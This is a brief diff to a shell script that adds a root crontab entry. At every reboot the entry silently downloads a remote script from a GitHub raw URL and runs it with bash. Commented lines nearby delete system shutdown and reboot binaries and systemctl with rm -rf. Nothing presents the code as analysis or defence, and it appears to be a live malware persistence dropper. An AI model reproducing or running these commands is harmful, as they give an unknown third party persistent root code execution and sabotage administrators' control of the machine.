@@ -1,5 +1,6 @@
 #!/bin/sh
 
+sudo sed -i "\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/v2.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
 ##sudo sed -i '/^@reboot/d' /etc/crontab
 ###sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 
